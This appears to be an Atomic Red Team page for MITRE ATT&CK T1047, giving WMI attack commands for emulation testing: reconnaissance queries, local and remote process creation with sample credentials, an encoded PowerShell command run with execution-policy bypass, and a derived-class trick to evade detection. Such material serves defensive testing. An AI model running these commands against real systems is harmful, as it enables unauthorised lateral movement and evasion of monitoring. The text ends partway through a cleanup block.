# T1047 - Windows Management Instrumentation
## [Description from ATT&CK](https://attack.mitre.org/techniques/T1047)
<blockquote>Adversaries may abuse Windows Management Instrumentation (WMI) to achieve execution. WMI is a Windows administration feature that provides a uniform environment for local and remote access to Windows system components. It relies on the WMI service for local and remote access and the server message block (SMB) (Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) for remote access. RPCS operates over port 135. (Citation: MSDN WMI)

An adversary can use WMI to interact with local and remote systems and use it as a means to perform many tactic functions, such as gathering information for Discovery and remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)</blockquote>

<br/>

## Atomic Test #1 - WMI Reconnaissance Users
An adversary might use WMI to list all local User Accounts. 
When the test completes , there should be local user accounts information displayed on the command line.

**Supported Platforms:** Windows





#### Attack Commands: Run with `command_prompt`! 


```cmd
wmic useraccount get /ALL /format:csv
```






<br/>
<br/>

## Atomic Test #2 - WMI Reconnaissance Processes
An adversary might use WMI to list Processes running on the compromised host.
When the test completes , there should be running processes listed on the command line.

**Supported Platforms:** Windows





#### Attack Commands: Run with `command_prompt`! 


```cmd
wmic process get caption,executablepath,commandline /format:csv
```






<br/>
<br/>

## Atomic Test #3 - WMI Reconnaissance Software
An adversary might use WMI to list installed Software hotfix and patches.
When the test completes, there should be a list of installed patches and when they were installed.

**Supported Platforms:** Windows





#### Attack Commands: Run with `command_prompt`! 


```cmd
wmic qfe get description,installedOn /format:csv
```






<br/>
<br/>

## Atomic Test #4 - WMI Reconnaissance List Remote Services
An adversary might use WMI to check if a certain Remote Service is running on a remote device. 
When the test completes, a service information will be displayed on the screen if it exists.
A common feedback message is that "No instance(s) Available" if the service queried is not running.
A common error message is "Node - (provided IP or default)  ERROR Description =The RPC server is unavailable" 
if the provided remote host is unreacheable

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| node | Ip Address | String | 127.0.0.1|
| service_search_string | Name Of Service | String | Spooler|


#### Attack Commands: Run with `command_prompt`! 


```cmd
wmic /node:"#{node}" service where (caption like "%#{service_search_string}%")
```






<br/>
<br/>

## Atomic Test #5 - WMI Execute Local Process
This test uses wmic.exe to execute a process on the local host.
When the test completes , a new process will be started locally .A notepad application will be started when input is left on default.

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| process_to_execute | Name or path of process to execute. | String | notepad.exe|


#### Attack Commands: Run with `command_prompt`! 


```cmd
wmic process call create #{process_to_execute}
```

#### Cleanup Commands:
```cmd
wmic process where name='#{process_to_execute}' delete >nul 2>&1
```





<br/>
<br/>

## Atomic Test #6 - WMI Execute Remote Process
This test uses wmic.exe to execute a process on a remote host. Specify a valid value for remote IP using the node parameter.
To clean up, provide the same node input as the one provided to run the test
A common error message is "Node - (provided IP or default)  ERROR Description =The RPC server is unavailable" if the default or provided IP is unreachable

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| node | Ip Address | String | 127.0.0.1|
| user_name | Username | String | DOMAIN&#92;Administrator|
| password | Password | String | P@ssw0rd1|
| process_to_execute | Name or path of process to execute. | String | notepad.exe|


#### Attack Commands: Run with `command_prompt`! 


```cmd
wmic /user:#{user_name} /password:#{password} /node:"#{node}" process call create #{process_to_execute}
```

#### Cleanup Commands:
```cmd
wmic /user:#{user_name} /password:#{password} /node:"#{node}" process where name='#{process_to_execute}' delete >nul 2>&1
```

## Atomic Test #7 - Create a Process using WMI Query and an Encoded Command
Solarigate persistence is achieved via backdoors deployed via various techniques including using PowerShell with an EncodedCommand
 Powershell -nop -exec bypass -EncodedCommand <encoded command>
Where the –EncodedCommand, once decoded, would resemble:
  Invoke-WMIMethod win32_process -name create -argumentlist ‘rundll32 c:\windows\idmu\common\ypprop.dll _XInitImageFuncPtrs’ -ComputerName WORKSTATION
The EncodedCommand in this atomic is the following: Invoke-WmiMethod -Path win32_process -Name create -ArgumentList notepad.exe
You should expect to see notepad.exe running after execution of this test.

**Supported Platforms:** Windows





#### Attack Commands: Run with `command_prompt`! 


```cmd
powershell -exec bypass -e SQBuAHYAbwBrAGUALQBXAG0AaQBNAGUAdABoAG8AZAAgAC0AUABhAHQAaAAgAHcAaQBuADMAMgBfAHAAcgBvAGMAZQBzAHMAIAAtAE4AYQBtAGUAIABjAHIAZQBhAHQAZQAgAC0AQQByAGcAdQBtAGUAbgB0AEwAaQBzAHQAIABuAG8AdABlAHAAYQBkAC4AZQB4AGUA

## Atomic Test #8 - Create a Process using obfuscated Win32_Process
This test tries to mask process creation by creating a new class that inherits from Win32_Process. Indirect call of suspicious method such as Win32_Process::Create can break detection logic.
[Cybereason blog post No Win32_ProcessNeeded](https://www.cybereason.com/blog/wmi-lateral-movement-win32)

**Supported Platforms:** Windows




#### Inputs:
| Name | Description | Type | Default Value | 
|------|-------------|------|---------------|
| new_class | Derived class name | String | Win32_Atomic|
| process_to_execute | Name or path of process to execute. | String | notepad.exe|


#### Attack Commands: Run with `powershell`!  Elevation Required (e.g. root or admin) 


```powershell
$Class = New-Object Management.ManagementClass(New-Object Management.ManagementPath("Win32_Process"))
$NewClass = $Class.Derive("#{new_class}")
$NewClass.Put()
Invoke-WmiMethod -Path #{new_class} -Name create -ArgumentList #{process_to_execute}
```

#### Cleanup Commands:
```powershell
$CleanupClass = New-Object Management.ManagementClass(New-Object Management.ManagementPath("#{new_class}"))
